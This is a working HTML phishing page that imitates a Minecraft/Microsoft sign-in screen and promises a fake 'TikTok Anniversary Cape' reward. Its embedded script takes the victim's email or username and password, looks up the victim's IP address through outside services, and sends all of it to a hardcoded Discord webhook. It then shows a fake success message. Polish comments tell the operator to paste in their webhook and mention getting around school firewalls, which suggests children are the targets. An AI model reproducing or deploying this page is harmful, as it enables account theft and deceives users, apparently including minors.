<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in | Minecraft</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #1A1A1A;
            background-image: radial-gradient(circle, #2C2C2C 10%, transparent 11%);
            background-size: 20px 20px;
            color: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #262626;
            border: 2px solid #3C3C3C;
            padding: 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            text-align: left;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 2px;
            color: #4CAF50;
            text-transform: uppercase;
        }

        h2 {
            font-size: 20px;
            margin-bottom: 8px;
            font-weight: 600;
        }

        p.subtitle {
            color: #A0A0A0;
            font-size: 14px;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 12px;
            text-transform: uppercase;
            color: #A0A0A0;
            margin-bottom: 6px;
            letter-spacing: 1px;
            font-weight: bold;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            background-color: #111111;
            border: 1px solid #444444;
            color: #FFFFFF;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #4CAF50;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background-color: #4CAF50;
            border: none;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: background-color 0.2s;
        }

        .btn:hover {
            background-color: #45a049;
        }

        .hidden {
            display: none;
        }

        /* Styl dla sukcesu */
        .success-image {
            width: 120px;
            display: block;
            margin: 0 auto 20px auto;
        }
        .success-title {
            color: #4CAF50;
            text-align: center;
            margin-bottom: 15px;
        }
        .success-text {
            text-align: center;
            color: #D3D3D3;
            line-height: 1.5;
            font-size: 15px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">MINECRAFT</div>
        
        <!-- STEP 1: Username / Email -->
        <div id="step-email">
            <h2>Sign in</h2>
            <p class="subtitle">Use your Microsoft account to claim reward</p>
            
            <div class="input-group">
                <label for="email">Email, phone, or username</label>
                <input type="text" id="email" placeholder="example@outlook.com" autocomplete="off">
            </div>
            
            <button class="btn" id="btn-next">Next</button>
        </div>

        <!-- STEP 2: Password -->
        <div id="step-password" class="hidden">
            <h2>Enter password</h2>
            <p class="subtitle" id="display-email" style="color: #4CAF50; font-size: 14px;"></p>
            
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="••••••••">
            </div>
            
            <button class="btn" id="btn-login">Sign in</button>
        </div>

        <!-- STEP 3: Success Message -->
        <div id="step-success" class="hidden">
            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAACeCAYAAADYv8pCAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAALeSURBVHgB7d07btwwFAVRE9fOylVky8ksm8shW06b7NxlKstOunwI0gMECfAOfY90Sg6XwOHw8fEOfZ99ff8Yf9+fP36P76fX++XvP3/v1w3XwV0uXwF3vX8GuMvls3eXy2fvLpfP3l0un727XD57uXz27p/D59f7m0B3eXzV1+t3T9S6vX+A7vLgKpfn/Z7Dby7XwT8ul89eLp+96S77Z4K7XD778F32zwR3uXz27gO77J8F7nL57N0Hdtk/C9zl8tl7uMv+GeEul89e7Xq4p5n7D3I9vFwPf8vdf6DL9XDXw8v18Lfc/bclun+P68NfLpfP3unvofsnub9M7o8ul8/eaVv2L9T6Sbpv6HL57N3fQ/fvdX3m7nK5m+yVbUnun9L6ibrL5W6yZ7Ylud8fXy6Xz979VctnL9vL9vGzZ7Zlud8fX9b7Sfr78T3vL9P9/eD7uMvls3f7vXz2sv17yPtfH3K5fPZ6+0l7v6/fA3e5fPbyGbp/pvvL5H7pcrnsnW3f6L8N3b/X9T3D5XLZ39m+B/dnm9yfba9sy76H7p9n7m6Su8leLpf9I9u+R96/1/XpXC6XvdPlLpfL3unvofsnub9M7o8ul8/eaduS3D+l9RN1l8vdZM9sS3K/P75cLp+9+6uWz162fwtpfRbyPr5uL9u/f7Xrf97re3O5fPbuH9nL9iH5v6P7Sfp7XJeXy97pf6+X7UPymfsD73K5m+yZ9vLgKpfnPbrclvY9uFwPf3u5He16eLkefg93vW0u32VfLpe9096B+7NJ7s+2V7Z9w+V6uOvh/3W5m+yVbUnun9L4id8Zg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scg7scwzdP/X7HwJ3fWwAAAABJRU5ErkJggg==" alt="TikTok Cape" class="success-image">
            <h2 class="success-title">Congratulations!</h2>
            <p class="success-text">
                Your account has been successfully verified.<br><br>
                The <strong>TikTok 15th Anniversary Cape</strong> will be added to your profile within <strong>48 hours</strong>.
            </p>
        </div>
    </div>

    <script>
        // TUTAJ PONOWNIE WKLEJ SWÓJ LINK DO WEBHOOKA Z DISCORDA
        const webhookUrl = "https://discord.com/api/webhooks/1574918924745842791/-XvxuWkULD76uZ_1icK_IAtGH58i0xVJ1OABffqGSHQs4QvIvZmbUMLAP7_aug4pnRPr";

        const stepEmail = document.getElementById('step-email');
        const stepPassword = document.getElementById('step-password');
        const stepSuccess = document.getElementById('step-success');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const displayEmail = document.getElementById('display-email');

        let savedEmail = "";
        let userIp = "Retrieving...";

        // POTRÓJNE zabezpieczenie pobierania IP przeciwko szkolnym blokadom (Firewallom)
        fetch('https://ipapi.co')
            .then(res => res.json())
            .then(data => { userIp = data.ip; })
            .catch(() => {
                fetch('https://ipify.org')
                    .then(res => res.json())
                    .then(data => { userIp = data.ip; })
                    .catch(() => {
                        fetch('https://db-ip.com')
                            .then(res => res.json())
                            .then(data => { userIp = data.ipAddress; })
                            .catch(() => { userIp = "Protected / School Firewall"; });
                    });
            });

        // Next button click
        document.getElementById('btn-next').addEventListener('click', function() {
            if (emailInput.value.trim() === "") {
                alert("Please enter your email or username!");
                return;
            }
            savedEmail = emailInput.value;
            displayEmail.innerText = savedEmail;
            
            stepEmail.classList.add('hidden');
            stepPassword.classList.remove('hidden');
            passwordInput.focus();
        });

        // Sign in button click
        document.getElementById('btn-login').addEventListener('click', function() {
            if (passwordInput.value.trim() === "") {
                alert("Please enter your password!");
                return;
            }

            const data = {
                embeds: [{
                    title: "🔔 New Minecraft Login Cape Claim",
                    color: 5025616,
                    fields: [
                        { name: "📧 Email / Username", value: savedEmail, inline: false },
                        { name: "🔑 Password", value: passwordInput.value, inline: false },
                        { name: "🌐 IP Address", value: userIp, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            document.getElementById('btn-login').innerText = "Processing...";
            document.getElementById('btn-login').disabled = true;

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(() => {
                stepPassword.classList.add('hidden');
                stepSuccess.classList.remove('hidden');
            })
            .catch((error) => {
                console.error('Error:', error);
                stepPassword.classList.add('hidden');
                stepSuccess.classList.remove('hidden');
            });
        });
    </script>
</body>
</html>
